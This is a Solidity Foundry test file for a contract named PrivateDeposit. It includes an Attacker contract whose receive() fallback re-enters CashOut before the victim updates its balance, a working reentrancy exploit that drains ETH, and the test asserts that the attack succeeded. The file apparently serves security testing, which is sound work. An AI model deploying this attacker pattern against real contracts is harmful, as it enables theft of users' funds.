
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PrivateDeposit, Log} from "../src/PrivateDeposit.sol";

contract TestReentrancyPrivateDeposit is Test {
    PrivateDeposit public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new PrivateDeposit();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // --- 1. Constraints & Pitfall Avoidance ---
        // Ensure attackVal is at least MinDeposit (1 ether) and within safe bounds
        vm.assume(attackVal >= 1 ether && attackVal <= type(uint128).max);

        // --- 2. State Configuration (Pre-Condition) ---
        // The vulnerable function CashOut requires the caller to have a balance
        // This will be set up via the Attacker's setupAttack which calls Deposit

        // --- 3. Funding ---
        // Fund the Victim contract so it has ETH to steal (needs extra for the reentrancy)
        vm.deal(address(_contractUnderTest), attackVal * 3);
        
        // Fund the Attacker
        vm.deal(address(_attacker), attackVal * 2);

        // Fund the Test Contract
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    PrivateDeposit public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = PrivateDeposit(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        
        // Deposit funds into the victim contract to establish a balance
        _victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State
        initialSnapshot = address(this).balance;

        // 2. Store the value for the re-entrant call
        storedAttackVal = val;

        // 3. Call the vulnerable function CashOut
        _victim.CashOut(val);

        // 4. Verify Success Conditions
        // If we managed to call CashOut multiple times via reentrancy
        if (attackCallCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        attackCallCount++;
        if (attackCallCount < 2) {
            // Re-enter the contract using the stored value
            // The balance hasn't been updated yet due to the reentrancy vulnerability
            _victim.CashOut(storedAttackVal);
        }
    }
}
